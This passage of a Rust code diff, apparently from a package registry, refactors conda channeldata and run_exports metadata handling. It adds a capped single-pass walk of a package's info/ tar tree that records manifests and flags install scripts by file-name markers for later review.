@@ -1229,6 +1229,60 @@ fn extract_upload_filename(headers: &HeaderMap) -> Result<String, Response> {
 }
 
 // ---------------------------------------------------------------------------
+// The persisted-metadata contract (#4038)
+// ---------------------------------------------------------------------------
+//
+// `channeldata.json` and `run_exports.json` serve fields out of a hosted
+// package's `artifact_metadata.metadata` document. Those endpoints used to read
+// keys the upload path never wrote, so every hosted package served
+// `{"run_exports": {}}` and a channeldata entry with no summary, home or
+// source_url. The write path (`build_conda_metadata`) and the read paths below
+// now share these declarations, so they cannot drift apart again.
+
+/// The `artifact_metadata.metadata` keys `channeldata.json` reads back.
+const CHANNELDATA_METADATA_KEYS: [&str; 8] = [
+    "license",
+    "license_family",
+    "description",
+    "summary",
+    "home",
+    "doc_url",
+    "dev_url",
+    "source_url",
+];
+
+/// The `artifact_metadata.metadata` key `run_exports.json` reads back.
+const RUN_EXPORTS_METADATA_KEY: &str = "run_exports";
+
+/// Read a package's run exports out of its persisted metadata, as
+/// `run_exports.json` serves them. A package that declares none serves `{}`.
+fn package_run_exports(metadata: Option<&serde_json::Value>) -> serde_json::Value {
+    metadata
+        .and_then(|m| m.get(RUN_EXPORTS_METADATA_KEY))
+        .cloned()
+        .unwrap_or_else(|| serde_json::json!({}))
+}
+
+/// Fill any still-unset channeldata field from one artifact's persisted
+/// metadata. Packages are visited newest-first, so the first non-empty value
+/// wins and later (older) builds do not overwrite it.
+fn merge_channeldata_fields(
+    fields: &mut BTreeMap<&'static str, String>,
+    metadata: &serde_json::Value,
+) {
+    for key in CHANNELDATA_METADATA_KEYS {
+        if fields.contains_key(key) {
+            continue;
+        }
+        if let Some(value) = metadata.get(key).and_then(|v| v.as_str()) {
+            if !value.is_empty() {
+                fields.insert(key, value.to_string());
+            }
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
 // GET /conda/{repo_key}/channeldata.json
 // ---------------------------------------------------------------------------
 
@@ -1333,14 +1387,8 @@ async fn channeldata_json(
     // Collect all packages with their subdirs and metadata
     struct ChanneldataEntry {
         subdirs: BTreeSet<String>,
-        license: String,
-        license_family: String,
-        description: String,
-        summary: String,
-        home: String,
-        doc_url: String,
-        dev_url: String,
-        source_url: String,
+        /// The `CHANNELDATA_METADATA_KEYS` fields resolved for this package.
+        fields: BTreeMap<&'static str, String>,
     }
 
     let mut packages: BTreeMap<String, ChanneldataEntry> = BTreeMap::new();
@@ -1370,59 +1418,13 @@ async fn channeldata_json(
             .entry(pkg_name)
             .or_insert_with(|| ChanneldataEntry {
                 subdirs: BTreeSet::new(),
-                license: String::new(),
-                license_family: String::new(),
-                description: String::new(),
-                summary: String::new(),
-                home: String::new(),
-                doc_url: String::new(),
-                dev_url: String::new(),
-                source_url: String::new(),
+                fields: BTreeMap::new(),
             });
         entry.subdirs.insert(subdir);
 
         // Populate metadata from the most recently seen artifact with data
         if let Some(ref meta) = artifact.metadata {
-            if entry.license.is_empty() {
-                if let Some(v) = meta.get("license").and_then(|v| v.as_str()) {
-                    entry.license = v.to_string();
-                }
-            }
-            if entry.license_family.is_empty() {
-                if let Some(v) = meta.get("license_family").and_then(|v| v.as_str()) {
-                    entry.license_family = v.to_string();
-                }
-            }
-            if entry.description.is_empty() {
-                if let Some(v) = meta.get("description").and_then(|v| v.as_str()) {
-                    entry.description = v.to_string();
-                }
-            }
-            if entry.summary.is_empty() {
-                if let Some(v) = meta.get("summary").and_then(|v| v.as_str()) {
-                    entry.summary = v.to_string();
-                }
-            }
-            if entry.home.is_empty() {
-                if let Some(v) = meta.get("home").and_then(|v| v.as_str()) {
-                    entry.home = v.to_string();
-                }
-            }
-            if entry.doc_url.is_empty() {
-                if let Some(v) = meta.get("doc_url").and_then(|v| v.as_str()) {
-                    entry.doc_url = v.to_string();
-                }
-            }
-            if entry.dev_url.is_empty() {
-                if let Some(v) = meta.get("dev_url").and_then(|v| v.as_str()) {
-                    entry.dev_url = v.to_string();
-                }
-            }
-            if entry.source_url.is_empty() {
-                if let Some(v) = meta.get("source_url").and_then(|v| v.as_str()) {
-                    entry.source_url = v.to_string();
-                }
-            }
+            merge_channeldata_fields(&mut entry.fields, meta);
         }
     }
 
@@ -1433,29 +1435,8 @@ async fn channeldata_json(
             let subdirs: Vec<String> = entry.subdirs.into_iter().collect();
             let mut val = build_channeldata_package_entry(&subdirs, &version);
             // Include optional fields when available
-            if !entry.license.is_empty() {
-                val["license"] = serde_json::Value::String(entry.license);
-            }
-            if !entry.license_family.is_empty() {
-                val["license_family"] = serde_json::Value::String(entry.license_family);
-            }
-            if !entry.description.is_empty() {
-                val["description"] = serde_json::Value::String(entry.description);
-            }
-            if !entry.summary.is_empty() {
-                val["summary"] = serde_json::Value::String(entry.summary);
-            }
-            if !entry.home.is_empty() {
-                val["home"] = serde_json::Value::String(entry.home);
-            }
-            if !entry.doc_url.is_empty() {
-                val["doc_url"] = serde_json::Value::String(entry.doc_url);
-            }
-            if !entry.dev_url.is_empty() {
-                val["dev_url"] = serde_json::Value::String(entry.dev_url);
-            }
-            if !entry.source_url.is_empty() {
-                val["source_url"] = serde_json::Value::String(entry.source_url);
+            for (key, value) in entry.fields {
+                val[key] = serde_json::Value::String(value);
             }
             (name, val)
         })
@@ -1521,13 +1502,9 @@ async fn run_exports_json(
             continue;
         }
 
-        // Extract run_exports from metadata if available
-        let run_exports = artifact
-            .metadata
-            .as_ref()
-            .and_then(|m| m.get("run_exports"))
-            .cloned()
-            .unwrap_or_else(|| serde_json::json!({}));
+        // Extract run_exports from metadata if available. The upload path
+        // persists `info/run_exports.json` under the same key (#4038).
+        let run_exports = package_run_exports(artifact.metadata.as_ref());
 
         packages.insert(
             filename.to_string(),
@@ -2441,12 +2418,22 @@ fn build_channeldata_entry(
             .and_then(|m| m.get(field).and_then(|v| v.as_str()))
             .unwrap_or("")
     };
-    serde_json::json!({
+    let mut entry = serde_json::json!({
         "subdirs": [subdir],
         "version": version.unwrap_or("0"),
         "license": meta_str("license"),
         "summary": meta_str("summary"),
-    })
+    });
+    // The remaining channeldata fields come from the package's about.json and
+    // are omitted when the package did not declare them (#4038).
+    if let Some(metadata) = metadata {
+        let mut fields = BTreeMap::new();
+        merge_channeldata_fields(&mut fields, metadata);
+        for (key, value) in fields {
+            entry[key] = serde_json::Value::String(value);
+        }
+    }
+    entry
 }
 
 /// Build merged repodata.json for a virtual repository by combining member repos.
@@ -3073,8 +3060,33 @@ fn extract_conda_metadata(content: &[u8], filename: &str) -> Option<serde_json::
 /// Protects against decompression bombs in crafted packages.
 const MAX_DECOMPRESSED_METADATA_SIZE: usize = 100 * 1024 * 1024;
 
-/// Maximum number of tar entries to iterate when searching for metadata.
-const MAX_TAR_ENTRIES: usize = 10_000;
+/// Per-entry read cap for the small JSON/text documents under `info/`
+/// (`about.json`, `link.json`, `run_exports.json`, `hash_input.json` and the
+/// recipe text). These are human-scale files — even a verbose `about.json`
+/// description or a long `meta.yaml` is a few tens of KiB — so 1 MiB is orders
+/// of magnitude above anything real while staying well inside the shared
+/// ingest caps (#4037).
+const MAX_CONDA_INFO_ENTRY_BYTES: u64 = 1024 * 1024;
+
+/// Per-entry read cap for an install script found in the package payload.
+///
+/// Deliberately the *same* small-document cap as the `info/` text members
+/// rather than a payload-sized one: a link script is a few lines of shell or
+/// batch, and a "script" a megabyte long is not something a reviewer reads —
+/// it is something the analyzer would have to buffer. A script over the cap is
+/// recorded as unreadable and the analysis drops to `Partial`, exactly as an
+/// over-cap `info/` member does (#4033, #4037).
+const MAX_CONDA_SCRIPT_ENTRY_BYTES: u64 = MAX_CONDA_INFO_ENTRY_BYTES;
+
+/// Read cap for the per-file manifest (`info/paths.json`, or the legacy
+/// `info/files` list). Deliberately the *shared* ingest per-entry cap rather
+/// than the small-document cap above: a manifest carries one record per
+/// packaged file (~150 bytes once its sha256 and size are included), so 8 MiB
+/// still admits a ~55 000-file package. The rare package above that (texlive
+/// and friends) records its manifest as `unreadable` and ingests anyway,
+/// rather than buffering unbounded (#4037, #2556).
+const MAX_CONDA_MANIFEST_ENTRY_BYTES: u64 =
+    crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES;
 
 /// Decompress zstd with a size limit to prevent decompression bombs.
 fn limited_decode_zstd(compressed: &[u8], max_size: usize) -> Option<Vec<u8>> {
@@ -3095,94 +3107,694 @@ fn limited_decode_zstd(compressed: &[u8], max_size: usize) -> Option<Vec<u8>> {
     Some(output)
 }
 
+// ---------------------------------------------------------------------------
+// The `info/` tree (#4037)
+// ---------------------------------------------------------------------------
+//
+// A conda package's `info/` directory carries far more than `index.json`: the
+// long-form description (`about.json`), the per-file manifest with hashes
+// (`paths.json`, or the hash-less `files` list on older packages), the recipe
+// that built it, its run exports, its variant inputs, and its link metadata.
+// Every member but `index.json` is optional, so a package missing one still
+// ingests; `info_files` records *why* each member is missing so a consumer can
+// tell "this package has no recipe" from "we never looked".
+
+/// Slot names used both as `CondaInfoTree` keys and as the `info_files` status
+/// keys persisted with the package.
+const SLOT_ABOUT: &str = "about_json";
+const SLOT_PATHS: &str = "paths_json";
+const SLOT_FILES: &str = "files";
+const SLOT_RECIPE: &str = "recipe";
+const SLOT_LINK: &str = "link_json";
+const SLOT_RUN_EXPORTS: &str = "run_exports_json";
+const SLOT_HASH_INPUT: &str = "hash_input_json";
+
+/// The member was found and parsed.
+const INFO_STATUS_PRESENT: &str = "present";
+/// The package genuinely does not carry the member.
+const INFO_STATUS_ABSENT: &str = "absent";
+/// The member was there but could not be used — over its cap, or malformed.
+const INFO_STATUS_UNREADABLE: &str = "unreadable";
+
+/// The `about.json` fields promoted to the top level of the stored metadata
+/// document, where `channeldata.json` reads them back (#4038). `source_url` is
+/// handled separately because it is not always a string.
+const ABOUT_TEXT_FIELDS: [&str; 5] = ["summary", "description", "home", "doc_url", "dev_url"];
+
+/// Raw bytes of the `info/` members captured during a single bounded walk of
+/// the package's tar.
+#[derive(Default)]
+struct CondaInfoTree {
+    index_json: Option<Vec<u8>>,
+    about_json: Option<Vec<u8>>,
+    paths_json: Option<Vec<u8>>,
+    files_list: Option<Vec<u8>>,
+    link_json: Option<Vec<u8>>,
+    run_exports_json: Option<Vec<u8>>,
+    hash_input_json: Option<Vec<u8>>,
+    /// `info/recipe/meta.yaml` and/or `recipe.yaml`, kept as raw bytes. Parsing
+    /// recipes is `conda_recipe.rs`'s job, not ingest's.
+    recipe: BTreeMap<String, Vec<u8>>,
+    /// Members that were present but could not be read (over their cap, or the
+    /// archive walk was cut short part-way through them).
+    unreadable: BTreeSet<&'static str>,
+}
+
+impl CondaInfoTree {
+    /// Status for a member we hold no bytes for: either it was never in the
+    /// archive, or reading it failed.
+    fn missing_status(&self, slot: &'static str) -> &'static str {
+        if self.unreadable.contains(slot) {
+            INFO_STATUS_UNREADABLE
+        } else {
+            INFO_STATUS_ABSENT
+        }
+    }
+}
+
+/// Map an `info/` path to the slot it fills and the read cap that applies.
+/// Returns `None` for the packaged payload, which ingest never reads.
+fn info_slot_for(path: &str) -> Option<(&'static str, u64)> {
+    match path {
+        "info/index.json" => Some((
+            "index_json",
+            crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES,
+        )),
+        "info/about.json" => Some((SLOT_ABOUT, MAX_CONDA_INFO_ENTRY_BYTES)),
+        "info/paths.json" => Some((SLOT_PATHS, MAX_CONDA_MANIFEST_ENTRY_BYTES)),
+        "info/files" => Some((SLOT_FILES, MAX_CONDA_MANIFEST_ENTRY_BYTES)),
+        "info/link.json" => Some((SLOT_LINK, MAX_CONDA_INFO_ENTRY_BYTES)),
+        "info/run_exports.json" => Some((SLOT_RUN_EXPORTS, MAX_CONDA_INFO_ENTRY_BYTES)),
+        "info/hash_input.json" => Some((SLOT_HASH_INPUT, MAX_CONDA_INFO_ENTRY_BYTES)),
+        // All four recipe variants, because they are NOT interchangeable and
+        // `conda_recipe::preferred_recipe_files` ranks them:
+        //   * `rendered_recipe.yaml` — rattler-build's evaluated recipe, with
+        //     `finalized_sources`. The best source of truth we ever get.
+        //   * `meta.yaml`            — conda-build's RENDERED recipe (Jinja
+        //     evaluated, selectors applied) despite the name.
+        //   * `recipe.yaml`          — rattler-build's raw v1 recipe.
+        //   * `meta.yaml.template`   — conda-build's raw Jinja template. Worst
+        //     case: every platform branch is emitted, so a Linux package
+        //     appears to vendor Windows-only sources.
+        // Capturing only the first two would silently downgrade every
+        // rattler-build package to "no vendored components" (#4045).
+        "info/recipe/meta.yaml"
+        | "info/recipe/recipe.yaml"
+        | "info/recipe/rendered_recipe.yaml"
+        | "info/recipe/meta.yaml.template" => Some((SLOT_RECIPE, MAX_CONDA_INFO_ENTRY_BYTES)),
+        // Some packages nest the info tar one level deeper; the historical
+        // extractor accepted any `*/index.json`, so keep that tolerance.
+        _ if path.ends_with("/index.json") => Some((
+            "index_json",
+            crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES,
+        )),
+        _ => None,
+    }
+}
+
+/// What a bounded tar walk managed to see.
+#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
+struct TarWalkOutcome {
+    /// The walk did not reach the end of the archive: the stream was truncated
+    /// or malformed, it breached the shared decompressed-byte budget, or it hit
+    /// the entry-count cap. Whatever sat past that point was never seen, so a
+    /// caller must not report "not present" as "not there".
+    truncated: bool,
+}
+
+/// Walk a decoded tar once, handing every entry to `visit`.
+///
+/// Bounded exactly like `bounded_archive`'s single-entry readers (#2556): the
+/// decoded stream carries the total-byte budget, the walk stops at the shared
+/// entry-count cap, and `visit` reads each entry through a per-entry cap of its
+/// own choosing. Nothing here fails the ingest — a broken archive ends the walk
+/// and reports `truncated`.
+///
+/// `visit` receives the normalised path, the entry type (so a caller can skip
+/// directories and symlinks) and the entry's bounded reader. It is shared by
+/// the `info/` walk and the payload script walk so that both are subject to the
+/// same three caps by construction rather than by copy.
+fn walk_bounded_tar<R: std::io::Read>(
+    reader: R,
+    what: &str,
+    mut visit: impl FnMut(&str, tar::EntryType, &mut dyn std::io::Read),
+) -> TarWalkOutcome {
+    let mut outcome = TarWalkOutcome::default();
+    let mut archive = tar::Archive::new(crate::util::bounded_archive::budgeted(reader));
+
+    let entries = match archive.entries() {
+        Ok(entries) => entries,
+        Err(e) => {
+            tracing::debug!("{} is not readable: {}", what, e);
+            outcome.truncated = true;
+            return outcome;
+        }
+    };
+
+    let mut entries_seen: u64 = 0;
+    for entry in entries {
+        // A truncated or over-budget archive keeps whatever it already yielded
+        // rather than discarding the package's metadata entirely.
+        let mut entry = match entry {
+            Ok(entry) => entry,
+            Err(e) => {
+                tracing::debug!("{} walk stopped early: {}", what, e);
+                outcome.truncated = true;
+                break;
+            }
+        };
+
+        entries_seen += 1;
+        if entries_seen > crate::util::bounded_archive::MAX_INGEST_ARCHIVE_ENTRIES {
+            tracing::debug!("{} exceeds the entry-count cap; stopping the walk", what);
+            outcome.truncated = true;
+            break;
+        }
+
+        let path = match entry.path() {
+            Ok(path) => path.to_string_lossy().to_string(),
+            Err(_) => continue,
+        };
+        let path = path.trim_start_matches("./").to_string();
+        let entry_type = entry.header().entry_type();
+
+        visit(&path, entry_type, &mut entry);
+    }
+
+    outcome
+}
+
+/// Walk a decoded tar once and capture every `info/` member we care about.
+///
+/// A member that breaches its cap is recorded as unreadable and skipped — it
+/// never fails the ingest.
+fn collect_conda_info_tree<R: std::io::Read>(reader: R) -> CondaInfoTree {
+    let mut tree = CondaInfoTree::default();
+
+    walk_bounded_tar(reader, "conda info tar", |path, _entry_type, entry| {
+        let Some((slot, cap)) = info_slot_for(path) else {
+            return;
+        };
+
+        match crate::util::bounded_archive::read_capped(entry, cap, path) {
+            Ok(bytes) => match slot {
+                "index_json" => {
+                    // `info/index.json` wins over a nested `*/index.json`.
+                    if tree.index_json.is_none() || path == "info/index.json" {
+                        tree.index_json = Some(bytes);
+                    }
+                }
+                SLOT_ABOUT => tree.about_json = Some(bytes),
+                SLOT_PATHS => tree.paths_json = Some(bytes),
+                SLOT_FILES => tree.files_list = Some(bytes),
+                SLOT_LINK => tree.link_json = Some(bytes),
+                SLOT_RUN_EXPORTS => tree.run_exports_json = Some(bytes),
+                SLOT_HASH_INPUT => tree.hash_input_json = Some(bytes),
+                SLOT_RECIPE => {
+                    let name = path.rsplit('/').next().unwrap_or(path).to_string();
+                    tree.recipe.insert(name, bytes);
+                }
+                _ => {}
+            },
+            Err(e) => {
+                tracing::debug!("conda {} is not readable, skipping: {}", path, e);
+                tree.unreadable.insert(slot);
+            }
+        }
+    });
+
+    tree
+}
+
+/// `about.json`'s `source_url` is a plain string for single-source recipes and
+/// an array when the recipe pulls several sources. channeldata carries one
+/// string, so the array form collapses to its first usable entry.
+fn first_source_url(value: &serde_json::Value) -> Option<&str> {
+    match value {
+        serde_json::Value::String(s) if !s.is_empty() => Some(s.as_str()),
+        serde_json::Value::Array(items) => items
+            .iter()
+            .find_map(|item| item.as_str().filter(|s| !s.is_empty())),
+        _ => None,
+    }
+}
+
+/// conda runs a package's install-time scripts from marker files in the
+/// packaged file list (`bin/.<pkg>-post-link.sh`, `Scripts/.<pkg>-pre-unlink.bat`,
+/// …). `info/link.json` itself only describes noarch entry points, so the file
+/// manifest — not `link.json` — is what actually says whether a package runs
+/// code at install time.
+fn path_is_install_script(path: &str) -> bool {
+    const MARKERS: [&str; 3] = ["-pre-link.", "-post-link.", "-pre-unlink."];
+    MARKERS.iter().any(|marker| path.contains(marker))
+}
+
+/// Normalise `info/paths.json` into the stored manifest shape.
+fn build_paths_manifest(paths_json: &serde_json::Value) -> serde_json::Value {
+    let entries: Vec<serde_json::Value> = paths_json
+        .get("paths")
+        .and_then(|v| v.as_array())
+        .cloned()
+        .unwrap_or_default();
+    // Directory and softlink entries legitimately carry no hash, so the
+    // manifest is hash-bearing when *any* entry has one.
+    let has_hashes = entries.iter().any(|entry| {
+        entry
+            .get("sha256")
+            .and_then(|v| v.as_str())
+            .is_some_and(|s| !s.is_empty())
+    });
+    serde_json::json!({
+        "source": "paths.json",
+        "paths_version": paths_json.get("paths_version").cloned().unwrap_or(serde_json::Value::Null),
+        "has_hashes": has_hashes,
+        "file_count": entries.len(),
+        "paths": entries,
+    })
+}
+
+/// Normalise the legacy `info/files` list — a newline-separated set of paths
+/// with no hashes and no types — into the same manifest shape.
+fn build_files_manifest(bytes: &[u8]) -> serde_json::Value {
+    let text = String::from_utf8_lossy(bytes);
+    let entries: Vec<serde_json::Value> = text
+        .lines()
+        .map(str::trim)
+        .filter(|line| !line.is_empty())
+        .map(|path| serde_json::json!({ "_path": path }))
+        .collect();
+    serde_json::json!({
+        "source": "files",
+        "has_hashes": false,
+        "file_count": entries.len(),
+        "paths": entries,
+    })
+}
+
+/// The manifest recorded when a package carries neither `paths.json` nor
+/// `files` (or both were unreadable).
+fn empty_paths_manifest() -> serde_json::Value {
+    serde_json::json!({
+        "source": "none",
+        "has_hashes": false,
+        "file_count": 0,
+        "paths": [],
+    })
+}
+
+/// Merge the optional `info/` members into the parsed `index.json` object.
+///
+/// Nothing here can fail the ingest: a missing or malformed member is logged
+/// and recorded in `info_files`, and the package still publishes.
+fn enrich_with_info_tree(base: &mut serde_json::Value, tree: &CondaInfoTree) {
+    let Some(obj) = base.as_object_mut() else {
+        return;
+    };
+    let mut status = serde_json::Map::new();
+
+    // --- info/about.json --------------------------------------------------
+    let mut about_status = tree.missing_status(SLOT_ABOUT);
+    if let Some(bytes) = &tree.about_json {
+        match serde_json::from_slice::<serde_json::Value>(bytes) {
+            Ok(about) => {
+                about_status = INFO_STATUS_PRESENT;
+                for field in ABOUT_TEXT_FIELDS {
+                    if let Some(value) = about.get(field).and_then(|v| v.as_str()) {
+                        if !value.is_empty() {
+                            obj.insert(field.to_string(), serde_json::json!(value));
+                        }
+                    }
+                }
+                if let Some(url) = about.get("source_url").and_then(first_source_url) {
+                    obj.insert("source_url".to_string(), serde_json::json!(url));
+                }
+                // index.json carries the licence for most packages; older ones
+                // only declare it in about.json, so fill the gap without ever
+                // overriding what index.json said.
+                for field in ["license", "license_family"] {
+                    let already_set = obj
+                        .get(field)
+                        .and_then(|v| v.as_str())
+                        .is_some_and(|s| !s.is_empty());
+                    if already_set {
+                        continue;
+                    }
+                    if let Some(value) = about.get(field).and_then(|v| v.as_str()) {
+                        if !value.is_empty() {
+                            obj.insert(field.to_string(), serde_json::json!(value));
+                        }
+                    }
+                }
+                obj.insert("about".to_string(), about);
+            }
+            Err(e) => {
+                tracing::debug!("conda info/about.json is not valid JSON: {}", e);
+                about_status = INFO_STATUS_UNREADABLE;
+            }
+        }
+    }
+    status.insert(SLOT_ABOUT.to_string(), serde_json::json!(about_status));
+
+    // --- info/paths.json, falling back to info/files -----------------------
+    let mut paths_status = tree.missing_status(SLOT_PATHS);
+    let mut manifest: Option<serde_json::Value> = None;
+    if let Some(bytes) = &tree.paths_json {
+        match serde_json::from_slice::<serde_json::Value>(bytes) {
+            Ok(parsed) => {
+                paths_status = INFO_STATUS_PRESENT;
+                manifest = Some(build_paths_manifest(&parsed));
+            }
+            Err(e) => {
+                tracing::debug!("conda info/paths.json is not valid JSON: {}", e);
+                paths_status = INFO_STATUS_UNREADABLE;
+            }
+        }
+    }
+    let files_status = if tree.files_list.is_some() {
+        INFO_STATUS_PRESENT
+    } else {
+        tree.missing_status(SLOT_FILES)
+    };
+    if manifest.is_none() {
+        if let Some(bytes) = &tree.files_list {
+            manifest = Some(build_files_manifest(bytes));
+        }
+    }
+    let manifest = manifest.unwrap_or_else(empty_paths_manifest);
+    let has_install_scripts = manifest
+        .get("paths")
+        .and_then(|v| v.as_array())
+        .is_some_and(|entries| {
+            entries.iter().any(|entry| {
+                entry
+                    .get("_path")
+                    .and_then(|v| v.as_str())
+                    .is_some_and(path_is_install_script)
+            })
+        });
+    obj.insert("paths".to_string(), manifest);
+    obj.insert(
+        "has_install_scripts".to_string(),
+        serde_json::json!(has_install_scripts),
+    );
+    status.insert(SLOT_PATHS.to_string(), serde_json::json!(paths_status));
+    status.insert(SLOT_FILES.to_string(), serde_json::json!(files_status));
+
+    // --- info/recipe/ -----------------------------------------------------
+    // Raw text only. `conda_recipe.rs` owns parsing; ingest just hands it on.
+    let recipe_status = if tree.recipe.is_empty() {
+        tree.missing_status(SLOT_RECIPE)
+    } else {
+        let files: serde_json::Map<String, serde_json::Value> = tree
+            .recipe
+            .iter()
+            .map(|(name, bytes)| {
+                (
+                    name.clone(),
+                    serde_json::json!(String::from_utf8_lossy(bytes)),
+                )
+            })
+            .collect();
+        obj.insert("recipe".to_string(), serde_json::Value::Object(files));
+        INFO_STATUS_PRESENT
+    };
+    status.insert(SLOT_RECIPE.to_string(), serde_json::json!(recipe_status));
+
+    // --- the remaining JSON members, stored verbatim -----------------------
+    for (slot, bytes, key) in [
+        (SLOT_LINK, &tree.link_json, "link"),
+        (
+            SLOT_RUN_EXPORTS,
+            &tree.run_exports_json,
+            RUN_EXPORTS_METADATA_KEY,
+        ),
+        (SLOT_HASH_INPUT, &tree.hash_input_json, "hash_input"),
+    ] {
+        let mut slot_status = tree.missing_status(slot);
+        if let Some(bytes) = bytes {
+            match serde_json::from_slice::<serde_json::Value>(bytes) {
+                Ok(parsed) => {
+                    slot_status = INFO_STATUS_PRESENT;
+                    obj.insert(key.to_string(), parsed);
+                }
+                Err(e) => {
+                    tracing::debug!("conda info/{}.json is not valid JSON: {}", key, e);
+                    slot_status = INFO_STATUS_UNREADABLE;
+                }
+            }
+        }
+        status.insert(slot.to_string(), serde_json::json!(slot_status));
+    }
+
+    obj.insert("info_files".to_string(), serde_json::Value::Object(status));
+}
+
 /// Extract metadata from .conda (v2) ZIP package.
 ///
 /// The .conda format is a ZIP archive containing:
 /// - `metadata.json` at the root (with name, version, etc.)
-/// - `info-<name>-<ver>-<build>.tar.zst` (zstd-compressed tar with info/index.json)
+/// - `info-<name>-<ver>-<build>.tar.zst` (zstd-compressed tar with the `info/` tree)
 /// - `pkg-<name>-<ver>-<build>.tar.zst` (the actual package files)
+///
+/// Returns `index.json` enriched with the rest of the `info/` tree (#4037).
 fn extract_conda_v2_metadata(content: &[u8]) -> Option<serde_json::Value> {
     let cursor = std::io::Cursor::new(content);
     let mut archive = zip::ZipArchive::new(cursor).ok()?;
 
-    // First try metadata.json at the root of the ZIP. Cap the entry read so a
-    // crafted zip entry cannot buffer unbounded (#2556).
-    if let Ok(file) = archive.by_name("metadata.json") {
-        if let Ok(buf) = crate::util::bounded_archive::read_capped(
-            file,
-            crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES,
-            "conda metadata.json",
-        ) {
-            if let Ok(val) = serde_json::from_slice::<serde_json::Value>(&buf) {
-                // metadata.json may only have name/version; look for index.json in info tar
-                if val.get("depends").is_some() {
-                    return Some(val);
-                }
-            }
-        }
-    }
+    // `metadata.json` at the root of the ZIP. Real .conda packages only carry
+    // the format version here, but a package that inlines the full index takes
+    // precedence, as it always has. Cap the entry read so a crafted zip entry
+    // cannot buffer unbounded (#2556).
+    let root_index = archive
+        .by_name("metadata.json")
+        .ok()
+        .and_then(|file| {
+            crate::util::bounded_archive::read_capped(
+                file,
+                crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES,
+                "conda metadata.json",
+            )
+            .ok()
+        })
+        .and_then(|buf| serde_json::from_slice::<serde_json::Value>(&buf).ok())
+        .filter(|val| val.get("depends").is_some());
 
     // Collect file names first to avoid borrow conflicts
     let file_names: Vec<(usize, String)> = (0..archive.len())
         .filter_map(|i| archive.by_index(i).ok().map(|f| (i, f.name().to_string())))
         .collect();
 
+    let mut tree = CondaInfoTree::default();
     for (idx, name) in &file_names {
-        if name.starts_with("info-") && name.ends_with(".tar.zst") {
-            let file = archive.by_index(*idx).ok()?;
-            // Cap the read of the compressed inner archive so a crafted zip
-            // entry cannot buffer unbounded before we even reach zstd (#2556).
-            // The info tar carries only small metadata files, so the per-entry
-            // cap is generous; the actual package payload lives in pkg-*.tar.zst
-            // which we never read here.
-            let compressed = crate::util::bounded_archive::read_capped(
-                file,
-                crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES,
-                "conda info-*.tar.zst",
-            )
-            .ok()?;
-
-            // Decompress the zstd tar with size limit
-            let decompressed = limited_decode_zstd(&compressed, MAX_DECOMPRESSED_METADATA_SIZE)?;
-            let mut tar = tar::Archive::new(std::io::Cursor::new(&decompressed));
-
-            let mut entries_checked = 0;
-            for entry in tar.entries().ok()? {
-                entries_checked += 1;
-                if entries_checked > MAX_TAR_ENTRIES {
-                    break;
-                }
-                let mut entry = entry.ok()?;
-                let path = entry.path().ok()?.to_string_lossy().to_string();
-                if path == "info/index.json" || path.ends_with("/index.json") {
-                    // Cap the inner index.json read too (#2556).
-                    let buf = crate::util::bounded_archive::read_capped(
-                        &mut entry,
-                        crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES,
-                        "conda info/index.json",
-                    )
-                    .ok()?;
-                    return serde_json::from_slice(&buf).ok();
-                }
-            }
+        if !(name.starts_with("info-") && name.ends_with(".tar.zst")) {
+            continue;
         }
+        let Ok(file) = archive.by_index(*idx) else {
+            continue;
+        };
+        // Cap the read of the compressed inner archive so a crafted zip entry
+        // cannot buffer unbounded before we even reach zstd (#2556). The info
+        // tar carries only metadata files, so the per-entry cap is generous;
+        // the actual package payload lives in pkg-*.tar.zst which we never
+        // read here.
+        let Ok(compressed) = crate::util::bounded_archive::read_capped(
+            file,
+            crate::util::bounded_archive::MAX_INGEST_METADATA_ENTRY_BYTES,
+            "conda info-*.tar.zst",
+        ) else {
+            continue;
+        };
+
+        // Decompress the zstd tar with size limit
+        let Some(decompressed) = limited_decode_zstd(&compressed, MAX_DECOMPRESSED_METADATA_SIZE)
+        else {
+            continue;
+        };
+        tree = collect_conda_info_tree(std::io::Cursor::new(decompressed));
+        break;
     }
 
-    None
+    let mut base = root_index.or_else(|| {
+        tree.index_json
+            .as_ref()
+            .and_then(|bytes| serde_json::from_slice::<serde_json::Value>(bytes).ok())
+    })?;
+    enrich_with_info_tree(&mut base, &tree);
+    Some(base)
 }
 
 /// Extract metadata from .tar.bz2 (v1) conda package.
 ///
-/// The package is a bzip2-compressed tar containing `info/index.json`.
+/// The package is a bzip2-compressed tar containing the `info/` tree. A single
+/// bounded walk reads `info/index.json` plus every optional member (#4037);
+/// the walk carries the same three caps as `bounded_archive`'s single-entry
+/// readers — a total decompressed-byte budget, an entry-count cap, and a
+/// per-entry cap — so the #2556 hardening still holds.
 fn extract_conda_v1_metadata(content: &[u8]) -> Option<serde_json::Value> {
-    // Route through the shared bounded bz2/tar extractor: total-byte budget +
-    // entry-count cap + per-metadata-entry cap (#2556) close the v1 gap (which
-    // previously had only an entry-count cap and no total-byte cap).
-    let bytes = crate::util::bounded_archive::read_metadata_from_tar_bz2(content, |path| {
-        path == std::path::Path::new("info/index.json")
-    })
-    .ok()??;
-    serde_json::from_slice(&bytes).ok()
+    let tree = collect_conda_info_tree(bzip2::read::BzDecoder::new(content));
+    let mut base: serde_json::Value = serde_json::from_slice(tree.index_json.as_ref()?).ok()?;
+    enrich_with_info_tree(&mut base, &tree);
+    Some(base)
+}
+
+// ---------------------------------------------------------------------------
+// Install scripts in the payload (#4033)
+// ---------------------------------------------------------------------------
+//
+// conda executes `bin/.<pkg>-post-link.sh`, `bin/.<pkg>-pre-unlink.sh` and
+// their Windows `Scripts/.<pkg>-post-link.bat` equivalents at link time, as
+// the installing user. None of them live under `info/`: they are ordinary
+// packaged files in the payload — the `pkg-*.tar.zst` member of a `.conda`,
+// and the same tar as `info/` in a `.tar.bz2`. The `info/` walk above never
+// opened the payload, so the install-script analysis was wired to an empty
+// list. This is the extraction side that feeds it.
+
+/// Install-script bytes harvested from a package, plus what the scan could not
